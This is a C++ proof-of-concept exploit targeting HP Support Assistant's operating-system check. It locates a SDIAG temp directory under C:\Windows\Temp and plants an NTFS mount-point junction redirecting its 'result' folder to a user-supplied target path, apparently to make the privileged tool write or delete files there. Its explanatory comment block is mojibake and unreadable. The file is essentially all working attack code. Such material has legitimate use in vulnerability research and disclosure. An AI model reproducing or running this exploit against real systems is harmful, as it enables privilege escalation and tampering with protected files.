//  Copyright 2015 Google Inc. All Rights Reserved.
//
//  Licensed under the Apache License, Version 2.0 (the "License");
//  you may not use this file except in compliance with the License.
//  You may obtain a copy of the License at
//
//  http ://www.apache.org/licenses/LICENSE-2.0
//
//  Unless required by applicable law or agreed to in writing, software
//  distributed under the License is distributed on an "AS IS" BASIS,
//  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//  See the License for the specific language governing permissions and
//  limitations under the License.

/*
* HP Support Assistant�� �����Ѵ�.
* ��ġ ����(Device Support)���� �̵��� ��, ���� �� ������ �����Ѵ�.
* PoC�� �����Ѵ�.
* � ü�� ������ �����Ѵ�. (Temp ���丮 Write)
* ���� ����ȭ �۾��� �����Ѵ�. (Temp ���丮 Delete)
* PoC�� ���� Ÿ�ٿ� ��ũ�� �����ȴ�. (CreateMountPoint.exe C:\\Windows\\Temp\\SDIAG_{Random GUID}\\result C:\\Test)
* � ü�� ������ �����Ѵ�.
* �ش� PoC�� ���� ���� ������ �����ȴ�.
*/


#include "stdafx.h"
#include <tchar.h>
#include <CommonUtils.h>
#pragma warning(disable : 4996)

int _tmain(int argc, _TCHAR* argv[])
{
	if (argc < 2)
	{
		printf("[+] Usage : HPOSCheck_PoC.exe [Target]\n");
		return 1;
	}

	printf("[+] Start HP Support Assistant Application and go to Device Support\n");
	printf("[+] Start Operation System Check\n");
	printf("[+] Wait for the operating system check to complete and press ENTER\n");
	getchar();

	_TCHAR tempPath[1024] = L"C:\\Windows\\Temp";

	WIN32_FIND_DATA data;

	HANDLE hFind = FindFirstFile(L"C:\\Windows\\Temp\\SDIAG_*", &data);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		printf("[!] Cannot Find sdiag Directory\n");
		return 1;
	}

	_TCHAR* sdiagDir = L"Error";

	while (FindNextFile(hFind, &data) != 0)
	{
		if (wcscmp(data.cFileName, L".") == 0 || wcscmp(data.cFileName, L"..") == 0)
			continue;
		else sdiagDir = data.cFileName;
	}

	_tprintf(TEXT("  >> sdiagDir : %s\n"), sdiagDir);

	_TCHAR sdiagPath[1024] = { 0, };
	wcscat(sdiagPath, tempPath);
	wcscat(sdiagPath, L"\\");
	wcscat(sdiagPath, sdiagDir);

	_TCHAR fullpath[1024] = { 0, };
	wcscat(fullpath, sdiagPath);
	wcscat(fullpath, L"\\");
	wcscat(fullpath, L"result");

	_tprintf(TEXT("  >> tempPath : %s\n"), tempPath);
	_tprintf(TEXT("  >> sdiagPath : %s\n"), sdiagPath);
	_tprintf(TEXT("  >> fullpath : %s\n"), fullpath);

	printf("\n[+] Start Optimize performance without additional options and press ENTER\n");
	getchar();

	CreateDirectory(sdiagPath, nullptr);
	CreateDirectory(fullpath, nullptr);

	if (CreateDirectory(fullpath, nullptr) || (GetLastError() == ERROR_ALREADY_EXISTS))
	{
		if (!ReparsePoint::CreateMountPoint(fullpath, argv[1], argc > 2 ? argv[2] : L""))
		{
			printf("[!] Error creating mount point - %ls\n", GetErrorMessage().c_str());
			return 1;
		}
	}
	else
	{
		printf("[!] Error creating directory - %ls\n", GetErrorMessage().c_str());
	}

	printf("[+] Successful creation of mount point directory junction\n");
	printf("[+] Now Close the operating system check window!!!\n");

	return 0;
}